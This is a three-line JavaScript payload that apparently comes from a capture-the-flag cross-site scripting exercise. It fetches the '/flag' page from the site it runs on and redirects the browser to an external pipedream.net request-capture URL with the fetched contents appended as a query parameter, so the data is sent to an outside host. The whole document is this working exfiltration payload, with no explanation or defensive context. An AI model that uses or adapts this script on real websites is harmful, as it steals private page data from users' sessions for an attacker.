fetch('/flag')
  .then(response => response.text())
  .then(data => location='https://enjz2rnlbmvxg.x.pipedream.net/?q='+(data));
